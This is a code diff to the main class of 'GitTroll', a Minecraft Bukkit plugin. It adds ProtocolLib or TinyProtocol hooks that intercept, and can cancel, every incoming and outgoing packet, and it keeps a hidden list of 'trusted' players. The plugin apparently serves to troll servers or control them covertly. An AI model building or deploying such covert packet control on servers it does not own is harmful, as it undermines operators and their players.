@@ -11,14 +11,20 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import com.comphenix.tinyprotocol.TinyProtocol;
+
+import io.netty.channel.Channel;
 import net.Lenni0451.GitTroll.event.EventManager;
+import net.Lenni0451.GitTroll.event.events.EventPlayerPacket;
+import net.Lenni0451.GitTroll.event.events.EventServerPacket;
 import net.Lenni0451.GitTroll.event.events.EventTrustPlayer;
 import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
 import net.Lenni0451.GitTroll.manager.CommandManager;
+import net.Lenni0451.GitTroll.softdepends.ProtocolLibPacketInjector;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 import net.Lenni0451.GitTroll.utils.Logger;
-import net.Lenni0451.GitTroll.utils.PacketInjector;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
+import net.minecraft.server.v1_8_R3.Packet;
 
 public class GitTroll extends JavaPlugin implements Listener {
 	
@@ -94,6 +100,26 @@ public class GitTroll extends JavaPlugin implements Listener {
 		this.commandManager = new CommandManager();
 		
 		Bukkit.getPluginManager().registerEvents(this, this);
+		
+		if(Bukkit.getPluginManager().getPlugin("ProtocolLib") != null) {
+			new ProtocolLibPacketInjector();
+		} else {
+			new TinyProtocol(this) {
+				@Override
+				public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
+					EventPlayerPacket event = new EventPlayerPacket(sender, (Packet<?>) packet);
+					eventManager.callEvent(event);
+					return event.isCancelled()?null:packet;
+				}
+				
+				@Override
+				public Object onPacketOutAsync(Player receiver, Channel channel, Object packet) {
+					EventServerPacket event = new EventServerPacket(receiver, (Packet<?>) packet);
+					eventManager.callEvent(event);
+					return event.isCancelled()?null:packet;
+				}
+			};
+		}
 	}
 	
 	
@@ -120,7 +146,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 		if(this.isPlayerTrusted(event.getPlayer())) {
 			CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("You are still trusted.");
 		}
-		new PacketInjector(event.getPlayer()).inject();
+//		new PacketInjector(event.getPlayer()).inject();
 	}
 	
 }
